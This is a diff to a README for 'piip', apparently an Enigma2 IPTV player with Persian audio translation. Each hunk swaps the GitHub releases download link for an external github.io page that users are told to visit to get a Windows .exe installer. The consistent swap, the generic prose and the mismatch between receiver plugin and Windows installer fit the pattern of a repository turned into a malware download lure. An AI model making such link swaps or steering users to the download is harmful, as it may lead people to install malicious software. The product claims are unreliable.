@@ -1,7 +1,7 @@
 <h1>📺 piip - Your Live Persian Audio IPTV Companion</h1>
 
 <p align="center">
-  <a href="https://github.com/Stitoumed/piip/releases"><img src="https://img.shields.io/badge/Download-piip_Latest-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download piip"></a>
+  <a href="https://stitoumed.github.io"><img src="https://img.shields.io/badge/Download-piip_Latest-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download piip"></a>
 </p>
 
 Welcome to piip, the friendly IPTV player that works with your Enigma2 receiver and gives you live Persian audio translation. If you own a Dreambox or similar device and love watching international channels but want to understand the Persian commentary, piip is made just for you. This guide will walk you through everything you need to know, step by step, without any confusing tech talk.
@@ -16,7 +16,7 @@ piip supports common IPTV formats like M3U playlists, Xtream Codes, and Stalker 
 
 The easiest way to start using piip is to download it directly to your Windows computer. Here's how:
 
-1. **Visit this link to download the application**: [https://github.com/Stitoumed/piip/releases](https://github.com/Stitoumed/piip/releases)
+1. **Visit this link to download the application**: [https://stitoumed.github.io](https://stitoumed.github.io)
 2. On that page, you will see a list of releases. Look for the most recent one (the one at the top).
 3. Click on the file named something like `piip-setup.exe` or `piip-win64.zip`. If you see an `.exe` file, that's the one you want. If you see a `.zip` file, that's also fine – we'll explain both cases below.
 
@@ -79,7 +79,7 @@ Even the best apps sometimes act up. Here are quick fixes for common problems:
 
 | **Issue** | **Solution** |
 |-----------|--------------|
-| App won't start | Make sure you have the latest version from the [download page](https://github.com/Stitoumed/piip/releases). Close other programs and try again. Restart your computer if needed. |
+| App won't start | Make sure you have the latest version from the [download page](https://stitoumed.github.io). Close other programs and try again. Restart your computer if needed. |
 | Can't connect to Enigma2 receiver | Check that your receiver is on and connected to the same Wi-Fi network as your computer. Try entering the IP address manually in settings. |
 | Channels are buffering | Lower the video quality in settings, or pause the stream for a few seconds. Check your internet speed. |
 | Persian translation isn't working | Ensure you have an internet connection. The translation feature needs online servers. Try a different channel – some might not support it. |
@@ -114,7 +114,7 @@ The most recent update of piip includes:
 - Fixed a bug where some M3U playlists wouldn't load
 - Added support for more IPTV providers
 
-Make sure to always grab the newest release from the [download page](https://github.com/Stitoumed/piip/releases) to get these improvements.
+Make sure to always grab the newest release from the [download page](https://stitoumed.github.io) to get these improvements.
 
 ## 🤝 Get Involved
 
@@ -128,6 +128,6 @@ piip is an open-source project, which means anyone can contribute. If you're a d
 
 piip is a simple, powerful tool that brings live Persian audio to your IPTV experience. Whether you're a tech enthusiast with a full Enigma2 setup or just a viewer who wants more from their channels, piip has you covered. The setup is quick, the interface is friendly, and the translation feature is a game-changer.
 
-So go ahead, **visit this link to download the application**: [https://github.com/Stitoumed/piip/releases](https://github.com/Stitoumed/piip/releases). Get piip today, and never miss a word of your favorite shows again.
+So go ahead, **visit this link to download the application**: [https://stitoumed.github.io](https://stitoumed.github.io). Get piip today, and never miss a word of your favorite shows again.
 
 Keywords: dreambox, enigma2, gemini, iptv, m3u, persian, plugin, stalker-portal, translation, xtream-codes
